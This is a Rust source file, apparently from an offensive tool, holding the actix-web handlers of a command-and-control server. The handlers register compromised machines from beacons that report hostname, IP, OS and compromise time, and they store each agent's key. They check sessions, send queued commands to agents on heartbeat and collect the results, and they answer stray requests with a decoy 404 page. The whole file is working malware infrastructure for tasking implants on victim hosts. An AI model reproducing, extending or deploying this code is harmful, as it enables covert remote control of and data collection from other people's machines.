use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::sync::mpsc::Sender;

use uuid::Uuid;
use actix_web::{HttpRequest, HttpResponse, Responder, web};

use crate::server::communication::message::{AgentMessage, ServerMessage};
use crate::core::c2::C2;
use crate::utils::logging::{Logging, LogEntry};


pub async fn handle_beacon(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
    // println!("Received: {:?}", msg);
    //log_tx.send((Logging::INFO, format!("Received beacon: {:?}", msg))).await.ok();
    Logging::INFO.log_global(&format!("Received beacon: {:?}", msg));

    match &*msg {
        AgentMessage::Beacon { 
            hostname, ip, os, time_compromised, key 
        } => {
            // Create/register the agent in the C2
            let mut c2 = c2.lock().await;
            let session = Uuid::new_v4().to_string();
            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await;
            log_tx.send((Logging::SUCCESS, format!("Agent {} connected from: {}", agent_id, &ip))).await.ok();
            Logging::SUCCESS.log_global(&format!("Agent {} connected from: {}", agent_id, &ip));


            // Handle key storage
            let _ = crate::utils::utils::save_key(agent_id, &key);

            // Respond to the agent with an Ack (includes its agent ID and session info)
            let ack = ServerMessage::Ack {
                agent_id,
                session_id: session,
                status: "Registered".to_string(),
            };

            Logging::INFO.log_global(&format!("Sent beacon acknowledgment: {:?}", ack));

            return HttpResponse::Ok().json(ack);
        }
        _ => { return HttpResponse::BadRequest().body("Invalid message type"); }
    }
    
}

pub async fn handle_heartbeat(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
    // println!("Received: {:?}", msg);
    //log_tx.send((Logging::INFO, format!("Received beacon: {:?}", msg))).await.ok();
    Logging::INFO.log_global(&format!("Received heartbeat: {:?}", msg));

    match &*msg {
        AgentMessage::Heartbeat { 
            agent_id, session_id, result 
        } => {
            let (valid_session, _agent_id_copy) = {
                let c2 = c2.lock().await;
                (c2.check_session(session_id).await, *agent_id)
            };

            if valid_session {
                if let Some(res) = result {
                    {
                        let c2 = c2.lock().await;
                        c2.update_result(*agent_id, res.clone()).await;
                    }
                    log_tx.send((Logging::INFO, format!("[+] Received data from Agent {}: {:?}", agent_id, res))).await.ok();
                    Logging::SUCCESS.log_global(&format!("[+] Received data from Agent {}", agent_id));
                }

                let tasks_opt = {
                    let c2 = c2.lock().await;
                    c2.get_tasks(*agent_id).await
                };

                match tasks_opt {
                    Some(tasks) => {
                        let num = tasks.len();
                        let task = ServerMessage::Task {
                            agent_id: *agent_id,
                            session_id: session_id.clone(),
                            command: tasks,
                        };
                        
                        // Logging::INFO.print_message(
                        //     &format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num)
                        // );
                        log_tx.send((Logging::INFO, format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num))).await.ok();
                        Logging::INFO.log_global(&format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num));

                        return HttpResponse::Ok().json(task);
                    }
                    None => {
                        // Logging::INFO.print_message(
                        //     &format!("[+] Received Heartbeat from Agent {}", agent_id)
                        // );
                        log_tx.send((Logging::INFO, format!("[+] Received Heartbeat from Agent {}", agent_id))).await.ok();
                        Logging::INFO.log_global(&format!("[+] Received Heartbeat from Agent {}", agent_id));

                        return HttpResponse::NoContent().finish()
                    }
                }
            }

            HttpResponse::BadRequest().body("Invalid session ID")
        }
        _ => HttpResponse::BadRequest().body("Invalid message type"),
    }

}

pub async fn handle_disconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
    Logging::INFO.log_global(&format!("Received disconnect: {:?}", msg));

    match &*msg {
        AgentMessage::Disconnect {
            agent_id, session_id
        } => {
            // Remove agent from C2
            let mut c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.remove_agent(*agent_id).await;
            }

            log_tx.send((Logging::INFO, format!("Agent {} disconnected", agent_id))).await.ok();

            HttpResponse::Ok().body("Removed agent")
        }
        _ => HttpResponse::BadRequest().body("Invalid message type")
    }
}

pub async fn handle_reconnect(msg: web::Json<AgentMessage>, c2: web::Data<Arc<Mutex<C2>>>, log_tx: web::Data<Sender<LogEntry>>) -> impl Responder {
    // log_tx.send((Logging::INFO, format!("Received reconnect: {:?}", msg))).await.ok();
    Logging::INFO.log_global(&format!("Received reconnect: {:?}", msg));

    match &*msg {
        AgentMessage::Reconnect {
            agent_id, session_id
        } => {
            let (valid_session, agent_id_copy) = {
                let c2 = c2.lock().await;
                (c2.check_session(session_id).await, *agent_id)
            };

            if valid_session {
                // agent_id should stay the same, but session id should change
                let c2 = c2.lock().await;
                c2.update_agent_time(agent_id_copy).await;

                let new_session = Uuid::new_v4().to_string();
                c2.update_agent_session(agent_id_copy, &new_session).await;

                let ack = ServerMessage::Ack {
                    agent_id: agent_id_copy,
                    session_id: new_session,
                    status: "Reconnected".to_string(),
                };

                log_tx.send((Logging::INFO, format!("Agent {} reconnected", agent_id_copy))).await.ok();
                Logging::INFO.log_global(&format!("Sent reconnect acknowledgment: {:?}", ack));

                return HttpResponse::Ok().json(ack);
            }

            HttpResponse::BadRequest().body("Invalid session ID")
        }
        _ => HttpResponse::BadRequest().body("Invalid message type")
    }

}

pub async fn handle_catch_all(req: HttpRequest, log_tx: web::Data<Sender<LogEntry>>) -> HttpResponse {
    let connection_info = req.connection_info();
    let ip = connection_info.realip_remote_addr().unwrap_or("unknown");
    let user_agent = req.headers().get("User-Agent").and_then(|ua| ua.to_str().ok()).unwrap_or("unknown");

    // println!("🔍 Unknown route: {} from {} [{}]", req.path(), ip, user_agent);
    log_tx.send((Logging::DEBUG, format!("Unknown route accessed: {} from {} [{}]", req.path(), ip, user_agent))).await.ok();
    Logging::DEBUG.log_global(&format!("Unknown route accessed: {} from {} [{}]", req.path(), ip, user_agent));

    HttpResponse::NotFound()
        .content_type("text/html")
        .body("<html><body><h1>404 - Page Not Found</h1></body></html>")
}

// GET route: health check
pub async fn health_check() -> impl Responder {
    Logging::INFO.log_global("C2 Server is running");
    HttpResponse::Ok().body("C2 Server is running")
}